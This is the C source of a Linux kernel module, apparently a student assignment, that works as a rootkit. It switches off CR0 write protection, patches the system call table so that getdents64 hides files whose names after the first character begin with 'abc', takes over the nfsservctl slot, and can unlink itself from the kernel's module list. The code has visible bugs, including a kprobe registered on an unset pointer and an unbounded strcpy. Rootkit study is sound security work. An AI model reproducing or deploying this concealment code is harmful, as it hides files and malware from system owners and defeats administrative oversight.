#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/special_insns.h>
#include <asm/processor-flags.h>
#include <asm/unistd.h>
#include <linux/seq_file.h>
#include <linux/fs.h>
#include <linux/syscalls.h> // For __NR_* definitions
#include <linux/slab.h>
#include <linux/kprobes.h>
#include </home/praneeth/Desktop/Ass2/intercepted_syscalls.h>


#ifdef pr_fmt
#undef pr_fmt
#endif
#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
static struct list_head *prev_module;
typedef long (*sys_call_ptr_t)(const struct pt_regs *);

static LIST_HEAD(intercepted_syscalls_list);

static sys_call_ptr_t *real_sys_call_table;
static sys_call_ptr_t original_getdents64;
static sys_call_ptr_t original_olduname; 


static unsigned long sys_call_table_addr;
static int hidden;
module_param(sys_call_table_addr, ulong, 0);
MODULE_PARM_DESC(sys_call_table_addr, "Address of sys_call_table");
module_param(hidden, int, 0);
MODULE_PARM_DESC(hidden, "Bit to hide module");
static char symbol[KSYM_NAME_LEN] = "kernel_clone";
module_param_string(symbol, symbol, KSYM_NAME_LEN, 0644);
static struct kprobe kp;
struct linux_dirent64 {
    unsigned long long d_ino;
    long long           d_off;
    unsigned short      d_reclen;
    char                d_name[];
};
void add_intercepted_syscall(int syscall_number, sys_call_ptr_t original_handler) {
    struct intercepted_syscall *entry = kmalloc(sizeof(struct intercepted_syscall), GFP_KERNEL);
    if (!entry)
        return;

    entry->syscall_number = syscall_number;
    entry->original_handler = original_handler;
    INIT_LIST_HEAD(&entry->list);

    // Add the entry to the list
    list_add(&entry->list, &intercepted_syscalls_list);
}

// Function to update the original handler of an intercepted syscall
void update_intercepted_syscall(int syscall_number, sys_call_ptr_t original_handler) {
    struct intercepted_syscall *entry;
    list_for_each_entry(entry, &intercepted_syscalls_list, list) {
        if (entry->syscall_number == syscall_number) {
            entry->original_handler = original_handler;
            break;
        }
    }
}

// Function to print the intercepted syscalls
void print_intercepted_syscalls(void) {
    struct intercepted_syscall *entry;
    pr_info("Intercepted System Calls:\n");
    list_for_each_entry(entry, &intercepted_syscalls_list, list) {
        pr_info("Syscall %d: %p\n", entry->syscall_number, entry->original_handler);
    }
}
void hide_module(int hidden1) {
	if(hidden1 == 1){
		 // Unlink the module from the list
    		prev_module = THIS_MODULE->list.prev;
    		/* Remove ourselves from the list module list */
    		list_del(&THIS_MODULE->list);
	}
   
}

// Function to show (reveal) the module in the kernel's module list
void show_module(void) {
    // Re-link the module to the list at the original position (prev_module)
    list_add(&THIS_MODULE->list, prev_module);
}
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    pr_info("pre_handler: p->addr=0x%p\n", (void *)p->addr);
    pr_info("eax: %08lx ebx: %08lx ecx: %08lx edx: %08lx\n", regs->ax, regs->bx, regs->cx, regs->dx);
    pr_info("esi: %08lx edi: %08lx ebp: %08lx esp: %08lx\n", regs->si, regs->di, regs->bp, regs->sp);
    pr_info("ds: %04x es: %04x\n", (unsigned int)regs->dx, (unsigned int)regs->cs);
    return 0;
}

static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{
    pr_info("post_handler: p->addr=0x%p\n", (void *)p->addr);
}



// Since Linux v5.3, [native_]write_cr0 won't change "sensitive" CR0 bits.
static void write_cr0_unsafe(unsigned long val)
{
    asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
}
// Define a custom read function that intercepts the sys_read call.



static long rtkit_chk(const struct pt_regs *regs) {
    print_intercepted_syscalls();
    return 0;
}
void removeString (char text[], int index, int rm_length)
{
    int i;

    for ( i = 0; i < index; ++i )
        if ( text[i] == '\0' )
            return;

    for ( ; i < index + rm_length; ++i )
        if ( text[i] == '\0' ) {
            text[index] = '\0';
            return;
        }

    do {
        text[i - rm_length] = text[i];
    } while ( text[i++] != '\0' );
}
static long my_getdents64(const struct pt_regs *regs)
{
    long ret = original_getdents64(regs);
    struct linux_dirent64 *dirent;
    struct linux_dirent64 *prev_dirent = NULL;
    int offset = 0;
    char temp[100];
    if (ret <= 0)
        return ret;
    while (offset < ret) {
        dirent = (struct linux_dirent64 *)((char *)regs->si + offset);
        strcpy(temp,dirent->d_name);
        removeString(temp,0,1);
        if (strncmp(temp, "abc",3) == 0) {
            if (prev_dirent){
                prev_dirent->d_reclen += dirent->d_reclen;
                offset += dirent->d_reclen; // Skip the entry
                ret -= dirent->d_reclen;
                }
            else{
                //dirent = (struct linux_dirent64 *)((char *)dirent + dirent->d_reclen);
             offset += dirent->d_reclen;    
             ret -= dirent->d_reclen;
        	}
        }
        else {
            prev_dirent = dirent;
            offset += dirent->d_reclen;
        }
    }
    return ret;
}

static int __init modinit(void)
{
    unsigned long old_cr0;
    real_sys_call_table = (typeof(real_sys_call_table))sys_call_table_addr;

    pr_info("init\n");
    kp.pre_handler = handler_pre;
    kp.post_handler = handler_post;
    //kp.symbol_name = "do_fork";
    kp.addr=(kprobe_opcode_t*)original_getdents64;
    if ((register_kprobe(&kp) < 0)) {
        printk("register_kprobe failed, returned"); return -1;
    }
    old_cr0 = read_cr0();
    write_cr0_unsafe(old_cr0 & ~(X86_CR0_WP));
    
    original_olduname = real_sys_call_table[__NR_nfsservctl];
    real_sys_call_table[__NR_nfsservctl] = rtkit_chk;
    add_intercepted_syscall(__NR_nfsservctl, original_getdents64);
    original_getdents64 = real_sys_call_table[__NR_getdents64];
    real_sys_call_table[__NR_getdents64] = my_getdents64;
    add_intercepted_syscall(__NR_getdents64, original_getdents64);
    hide_module(hidden);
    write_cr0_unsafe(old_cr0);
    pr_info("init done\n");

    return 0;
}

static void __exit modexit(void)
{
    unsigned long old_cr0;
    pr_info("exit\n");

    old_cr0 = read_cr0();
    write_cr0_unsafe(old_cr0 & ~(X86_CR0_WP));
    real_sys_call_table[__NR_getdents64] = original_getdents64;
    real_sys_call_table[__NR_nfsservctl] = original_olduname;
    
    write_cr0_unsafe(old_cr0);
    unregister_kprobe(&kp);	
    pr_info("goodbye\n");
}
EXPORT_SYMBOL(add_intercepted_syscall);
EXPORT_SYMBOL(update_intercepted_syscall);
EXPORT_SYMBOL(print_intercepted_syscalls);
module_init(modinit);
module_exit(modexit);

MODULE_VERSION("0.1");
MODULE_DESCRIPTION("Modify getdents64 syscall to exclude files with prefix 'abc'");
MODULE_AUTHOR("Praneeth Brungi");
MODULE_LICENSE("GPL");